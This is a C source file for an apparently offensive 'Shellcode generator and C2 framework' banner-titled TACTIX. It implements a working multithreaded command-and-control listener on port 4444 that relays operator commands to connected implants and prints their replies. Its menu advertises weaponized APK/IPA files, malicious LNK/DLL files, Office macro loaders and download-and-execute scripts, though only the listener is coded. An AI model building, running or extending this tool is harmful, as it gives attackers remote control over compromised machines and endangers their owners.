#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/select.h>
//#include <bios.h>

#define PORT 4444
#define BUFFER_SIZE 1024

void *client_handler(void *arg) {
    int client_sock = *(int *)arg;
    free(arg);
    char buffer[BUFFER_SIZE];
    ssize_t bytes_read;

    printf("Client connected\n\n");

    fd_set readfds;
    int maxfd = (client_sock > STDIN_FILENO) ? client_sock : STDIN_FILENO;

    while (1) {
        FD_ZERO(&readfds);
        FD_SET(client_sock, &readfds);
        FD_SET(STDIN_FILENO, &readfds);

        int activity = select(maxfd + 1, &readfds, NULL, NULL, NULL);
        if (activity < 0) {
            perror("select error");
            break;
        }

        if (FD_ISSET(STDIN_FILENO, &readfds)) {
            // Read command from stdin
            if (fgets(buffer, sizeof(buffer), stdin) == NULL) {
                // EOF or error
                break;
            }
            // Send command to implant
            send(client_sock, buffer, strlen(buffer), 0);
        }

        if (FD_ISSET(client_sock, &readfds)) {
            // Receive data from implant
            bytes_read = recv(client_sock, buffer, sizeof(buffer), 0);
            if (bytes_read <= 0) {
                printf("Client disconnected\n");
                break;
            }
            fwrite(buffer, 1, bytes_read, stdout);
            fflush(stdout);
        }
    }

    close(client_sock);
    return NULL;
}

int main() {

    int server_sock, *client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    pthread_t tid;
    //textbackground(WHITE);
    //textcolor(RED);
    printf(R"EOF(
Shellcode generator and C2 framework

>>===================================================<<
||d888888b  .d8b.   .o88b. d888888b d888888b db    db||
||`~~88~~' d8' `8b d8P  Y8 `~~88~~'   `88'   `8b  d8'||
||   88    88ooo88 8P         88       88     `8bd8' ||
||   88    88~~~88 8b         88       88     .dPYb. ||
||   88    88   88 Y8b  d8    88      .88.   .8P  Y8.||
||   YP    YP   YP  `Y88P'    YP    Y888888P YP    YP||
>>===================================================<<

)EOF");
    printf("[ ] Generate shellcode (raw, C, CSharp, Python)\n");
    printf("[ ] Generate payload (executable)\n");
    printf("[ ] Generate payload (binary)\n");
    printf("[ ] Patch shellcode binary file\n");
    printf("[ ] Encrypt shellcode\n");
    printf("[ ] Generate stub (C, ASM)\n");
    printf("[ ] Deploy .NET (C#) shellcode loader\n");
    printf("[ ] Create a weaponized APK file\n");
    printf("[ ] Create a weaponized IPA file (Objective-C)\n");\
    printf("[ ] Deploy malicious LNK file\n");
    printf("[ ] Deploy malicious DLL file\n");
    printf("[ ] Embed payload in Windows Executable (x86)\n");
    printf("[ ] Generate malicious Microsoft Office macro loader\n");
    printf("[ ] Create malicious JavaScript file\n");
    printf("[ ] Create malicious VBScript file\n");
    printf("[ ] Generate BAT file (Download and execute, copy and execute)\n");
    printf("[ ] Generate BASH script (Download and execute, copy and execute)\n");
    printf("[ ] Generate Powershell script (Download and execute, copy and execute)\n");
    printf("[ ] Create web application (hta)\n");
    printf("[*] Start C2 listener\n");
    printf("\n");

    // function that copies the templates from the directory
    // into the output folder and modifies as required

    

    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    if (listen(server_sock, 5) < 0) {
        perror("Listen failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    printf("C2 server listening on port %d...\n\n", PORT);
    
    while (1) {
        client_sock = malloc(sizeof(int));
        if (!client_sock) {
            perror("Malloc failed");
            continue;
        }

        *client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_len);
        if (*client_sock < 0) {
            perror("Accept failed");
            free(client_sock);
            continue;
        }

        if (pthread_create(&tid, NULL, client_handler, client_sock) != 0) {
            perror("Thread creation failed");
            close(*client_sock);
            free(client_sock);
        } else {
            pthread_detach(tid);
        }
    }

    close(server_sock);
    return 0;
}
